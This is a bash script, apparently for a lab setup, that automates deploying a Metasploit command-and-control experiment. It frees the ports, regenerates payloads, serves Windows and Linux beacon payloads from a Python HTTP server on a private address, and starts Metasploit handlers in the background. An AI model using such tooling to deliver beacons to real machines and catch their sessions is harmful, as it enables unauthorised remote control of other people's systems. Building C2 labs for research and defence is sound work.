#!/bin/bash

C2_DIR="/home/kali/Desktop/c2/msf-c2"
PAYLOAD_DIR="$C2_DIR/payloads"

echo "   C2 EXPERIMENT DEPLOYMENT AUTOMATION"
echo "=================================================="

# 1. Kill old processes
echo "[*] Cleaning up old processes..."
pkill -f "msfconsole"
fuser -k 4444/tcp 4445/tcp 4446/tcp 4447/tcp 4567/tcp 2>/dev/null

# 2. Regenerate Payloads
echo "[*] Regenerating organized payloads..."
cd $C2_DIR
./generate_payloads.sh

# 3. Start HTTP Server in Payloads directory
echo "[*] Starting HTTP Delivery Server on Port 4567..."
cd $PAYLOAD_DIR
nohup python3 -m http.server 4567 > /dev/null 2>&1 &

# 4. Start Metasploit Handlers
echo "[*] Starting Metasploit Research Handlers..."
cd $C2_DIR
nohup ./start_msf_c2.sh > /dev/null 2>&1 &

echo "   DEPLOYMENT COMPLETE"
echo "=================================================="
echo "HTTP Server: http://192.168.56.10:4567"
echo "Windows Payloads: /windows/win_beacon_https_[10,30,60]s.exe"
echo "Linux Payloads:   /linux/beacon_[10,30,60]s.py"
echo "Log File:         ~/Desktop/c2/session_logs.txt"
